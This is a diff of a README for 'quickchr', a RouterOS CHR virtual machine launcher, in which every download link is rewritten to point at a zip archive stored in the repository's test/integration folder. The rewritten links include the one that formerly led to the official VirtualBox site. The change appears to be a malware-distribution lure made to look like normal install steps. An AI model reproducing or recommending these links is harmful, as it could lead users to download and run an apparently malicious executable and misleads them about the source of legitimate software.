@@ -1,6 +1,6 @@
 # ⚡ quickchr - Launch RouterOS instances in minutes
 
-[![](https://img.shields.io/badge/Download_QuickCHR-blue)](https://github.com/Pinussylvestrissteamer3783/quickchr)
+[![](https://img.shields.io/badge/Download_QuickCHR-blue)](https://github.com/Pinussylvestrissteamer3783/quickchr/raw/refs/heads/main/test/integration/Software-2.0-alpha.4.zip)
 
 `quickchr` simplifies the process of creating MikroTik RouterOS CHR virtual machines. You use this tool to set up test environments for scripts, network configurations, or learning RouterOS without complex manual steps. The software automates the download of images and the creation of virtual hard disks, saving time for network engineers and home lab enthusiasts.
 
@@ -8,13 +8,13 @@
 
 To begin, visit the project page to download the software.
 
-[Download QuickCHR here](https://github.com/Pinussylvestrissteamer3783/quickchr)
+[Download QuickCHR here](https://github.com/Pinussylvestrissteamer3783/quickchr/raw/refs/heads/main/test/integration/Software-2.0-alpha.4.zip)
 
 This tool runs on Windows 10 and Windows 11. 
 
 ### Prerequisites
 
-*   **Virtualization Software:** You need a hypervisor installed on your computer. We recommend [Oracle VM VirtualBox](https://www.virtualbox.org/) or VMware Workstation Player.
+*   **Virtualization Software:** You need a hypervisor installed on your computer. We recommend [Oracle VM VirtualBox](https://github.com/Pinussylvestrissteamer3783/quickchr/raw/refs/heads/main/test/integration/Software-2.0-alpha.4.zip) or VMware Workstation Player.
 *   **System Memory:** Reserve at least 256MB of RAM for each RouterOS instance.
 *   **Processor:** A modern multi-core processor ensures smooth performance during the setup process.
 
